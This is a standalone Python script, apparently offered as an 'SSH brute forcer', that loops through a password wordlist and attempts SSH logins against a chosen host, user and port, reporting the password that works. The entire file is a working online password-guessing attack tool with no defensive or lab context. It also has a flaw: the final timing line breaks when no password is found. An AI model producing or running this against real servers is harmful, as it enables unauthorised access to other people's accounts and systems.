from pwn import * 
import paramiko ; from termcolor import colored ; import sys ; import pyfiglet ; import os ; import time

start = time.time()
banner=pyfiglet.figlet_format("SSH BRUTE FORCER", font = "digital" )
print(banner)
if len(sys.argv) != 5:
	print("USAGE :\npython3 ssh-brute.py [username] [IP address] [port] passwords.txt")
	end = time.time()
	total_time= end - start
	print("\n time (seconds): " + str(total_time))
	exit()
else:
	username = sys.argv[1]
	hostname = sys.argv[2]
	port = sys.argv[3]
	file_path = sys.argv[4]
	attempts = 0
	with open(file_path, "r") as password_list:
		for password in password_list:
			password = password.strip("\n")
			try:
				print("[[{}]] Trying password : {}".format(attempts+1, password))
				response = ssh(host=hostname, user=username, password=password, timeout=1, port=int(port), level=0)
				if response.connected():
					print(colored( 'PASSWORD Found! : ' + password, 'white', 'on_blue', attrs=['bold']).center(60, " "))
					response.close()
					end = time.time()
					break
				response.close()
			except paramiko.ssh_exception.AuthenticationException:
				print(colored("Password " + password + " is INCORRECT" , 'white','on_red').center(60, " "))
			attempts += 1
total_time= end - start
print("\t time (seconds): " + str(total_time))
